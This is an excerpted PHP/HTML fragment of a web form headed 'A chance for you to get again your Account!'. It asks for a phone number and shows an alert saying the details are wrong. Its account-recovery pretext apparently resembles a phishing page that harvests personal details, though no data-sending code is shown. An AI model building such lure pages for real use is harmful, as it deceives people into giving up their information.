...
if(isset($_POST['btn-send']))
{
	...
	{
		?>
        <script>alert('Your details are wrong !!!');</script>
        <?php
	}
    ...
    <td height="146" rowspan="2"><form id="form1" name="form1" method="post" action=""><table width="356" border="0" align="center">
      <tr>
        <td colspan="2"><div align="center">
          <h3>A chance for you to get again your Account! </h3>
        </div></td>
        </tr>
      <tr>
        <td height="100" colspan="2"><div align="center"><img src="Arrow1.jpeg" width="114" height="127" alt="f" /></div></td>
        </tr>
      <tr>
        <td bgcolor="#006633">
        ...
        <td bgcolor="#006633"><input type="text" name="phone" id="textfield"  placeholder="Your Phone Number" required="required"/></td>
        </tr>
      <tr>
        <td colspan="2"><div align="center">
      ...
      <tr>
        <td width="175"><a href="mail.php">Go back</a></td>
